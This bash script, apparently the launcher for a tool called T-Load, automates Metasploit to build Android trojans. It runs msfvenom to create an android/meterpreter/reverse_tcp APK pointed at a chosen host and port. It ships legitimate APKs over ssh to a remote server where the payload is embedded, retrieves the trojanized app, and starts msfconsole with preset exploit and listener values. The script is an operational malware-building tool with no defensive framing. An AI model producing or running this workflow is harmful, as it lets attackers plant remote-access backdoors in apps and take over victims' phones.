source $HOME/T-Load/host
git pull --all
dir="$HOME/T-Load"
cd $dir
metapath="$HOME/metasploit-framework"
cd $HOME/T-Load
clear
echo "----------------------------------"
echo "          Version = 6.9Beta       "
echo "----------------------------------"
echo "      SCRIPT BY SATHVIK K S       "
echo " PLEASE MAKE SURE THAT THE CURRENT "
echo " PATH CONTAINS METASPLOIT FRAMEWOTK"
echo "----------------------------------"
echo "Select option"
echo "0. Install requirements ----->> Must do if this is first use"
echo "1. Create Payload"
echo "2. Embed Payload"
echo "3. Launch msfconsole normally"
echo "4. Exit"
echo "5. Set default metasploit exploit to be used"
echo "6. Set default metasploit payload to be used"
echo "7. Set default metasploit lhost  to be used"
echo "8. Set default metasploit lport to be used"
echo "9. Launch msfconsole with default values"
echo "10. Redownload"
read -p ">|" o
if [ $o = "0" ]
then
./setup
elif [ $o = "10" ]
then
./redownload
elif [ $o = "3" ]
then
clear
cd $metapath
./msfconsole
tload
elif [ $o = "upload" ] || [ $o = "Upload" ]
then
clear
echo " Enter the path to the original apk WITH .apk extension."
read -p ">|" upath
rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" $upath sathvik@$host:/home/sathvik/payload
sleep 3
tload
elif [ $o = "download" ] || [ $o = "Download" ]
then
clear
echo " Please enter the final apk name WITH .apk extension."
read -p ">|" dname
echo " Please enter the download path."
read -p ">|" dpath
rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" sathvik@$host:/home/sathvik/embed/$dname $dpath
echo
echo
echo
echo
echo "If there was no error seen while downloading, then you app has been downloaded to "$dpath " with a name "$dname
sleep 5
tload
elif [ $o = "embed" ] || [ $o = "Embed" ]
then
clear
ssh -i $dir/key sathvik@$host -t './t.sh && exit'
elif [ $o = "2" ]
then
./embed
elif [ $o = "1" ]
then
clear
cd $metapath
echo "Enter HOST"
read -p ">|" host1
echo "Enter PORT"
read -p ">|" port1
echo "Please enter the complete path with .apk extension"
echo "where you want to save the payload to"
read -p ">|" p2
./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
cd ..
sleep 3
tload
elif [ $o = "4" ]
then
clear
exit
elif [ $o = "5" ]
then
rm $HOME/.msf_default/exploit
clear
echo "Enter exploit to be used"
read -p ">|" ex
echo "set exploit \"$ex\"" >> $HOME/.msf_default/exploit
echo "Value stored"
sleep 2
tload
elif [ $o = "6" ]
then
rm $HOME/T-Load/msf_default/payload
clear
echo "Enter payload to be used"
read -p ">|" py
echo "set payload \"$py\"" >> $HOME/.msf_default/payload
echo "Value stored"
sleep 2
tload
elif [ $o = "7" ]
then
rm $HOME/T-Load/msf_default/host
clear
echo "Enter lhost to be used"
read -p ">|" lh
echo "set lhostused \"$lh\"" >> $HOME/.msf_default/host
echo "Value stored"
sleep 2
tload
elif [ $o = "8" ]
then
rm $HOME/.msf_default/port
clear
echo "Enter lport to be used"
read -p ">|" lp
echo "set lportused \"$lp\"" >> $HOME/.msf_default/port
echo "Value stored"
sleep 2
tload
elif [ $o = "9" ]
then
[[ -s $HOME/.msf_default/exploit ]]
exp=$(echo $?)
[[ -s $HOME/.msf_default/payload ]]
pay=$(echo $?)
[[ -s $HOME/.msf_default/host ]]
hos=$(echo $?)
[[ -s $HOME/.msf_default/port ]]
por=$(echo $?)
if [ $exp = $pay ] && [ $hos = $por ] && [ $exp = $hos ] && [ $exp = "0" ]
then
clear
$HOME/.msf_default/msfload
else
clear
tload
echo "One or more of the default values have not been set. Please try again"
sleep 4
tload
fi
else
echo "Wrong choice. Please try again"
sleep 3
tload
fi
